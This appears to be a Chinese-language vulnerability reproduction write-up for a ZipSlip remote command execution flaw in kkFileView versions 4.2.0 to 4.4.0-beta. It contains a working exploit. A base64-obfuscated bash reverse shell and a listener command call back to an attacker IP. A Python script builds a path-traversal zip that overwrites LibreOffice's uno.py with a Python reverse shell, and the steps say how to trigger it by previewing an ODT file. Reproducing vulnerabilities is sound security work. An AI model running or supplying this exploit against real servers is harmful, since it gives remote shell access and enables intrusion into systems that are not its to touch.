---
title: "kkFileView ZipSlip 远程命令执行漏洞"
date: 2026-11-19 00:00:00
---

# kkFileView ZipSlip 远程命令执行漏洞

kkFileView 是一个文档预览解决方案。

在 kkFileView 4.4.0-beta 以前，存在一处 ZipSlip 漏洞。攻击者可以利用该漏洞，向服务器任意目录下写入文件，导致任意命令执行漏洞。

影响范围：

kkFileView@[4.2.0, 4.4.0-beta]



复现

这里的攻击机是172.20.209.18

反弹shell的payload

```
bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjIwLjIwOS4xOC80NDQ0IDA+JjE=}|{base64,-d}|bash
```

这里选择的是base64无空格的反弹shell的payload

防止这里的反弹shell的特殊字符去阻碍或者报错

攻击机先开监听

```
nc -lvnp 4444
```



这里我们先制作压缩包用下面的脚本

```
import zipfile

if __name__ == "__main__":
    try:
        # 你的监听 IP 和端口
        LHOST = "172.20.209.18"
        LPORT = 4444

        # 伪装用的正常文件
        binary1 = b'vulhub'

        # 纯 Python 反弹 Shell（不依赖 /dev/tcp，Dash 环境下也能跑）
        payload = f'''import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{LHOST}", {LPORT}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
'''
        binary2 = payload.encode()

        zipFile = zipfile.ZipFile("shell.zip", "a", zipfile.ZIP_DEFLATED)
        zipFile.writestr("test", binary1)

        # 路径穿越，覆盖 LibreOffice 启动脚本
        zipFile.writestr(
            "../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py",
            binary2
        )
        zipFile.close()
        print(f"[+] shell.zip 已生成，反弹地址: {LHOST}:{LPORT}")
    except IOError as e:
        raise e
```

使用

```
python 1.py
```

这样就可以生成shell.zip了

此时我们上传这个压缩包

此时我们在上传一个sample.odt



对于sample.odt

它就是一个普通的最小 ODT 样本，没有任何恶意内容。它的唯一作用是让 kkFileView 把它交给 LibreOffice转换，从而触发加载被投毒的 uno.py。





我们先预览shell.zip，再预览sample.odt

当我们发现预览sample.odt进行长时间的加载就说明反弹shell执行成功

![image-20261119211225069](/img/misc/image-20261119211225069_2.png)



这里要注意如果第一次上传成功，且反弹shell成功

之后复现访问sample.odt，它不会加载，因为浏览器已经有了缓存，所以可以去开无痕浏览，或者在访问的最后面加上&forceUpdatedCache=true这个开关，强制加载，跳过缓存。
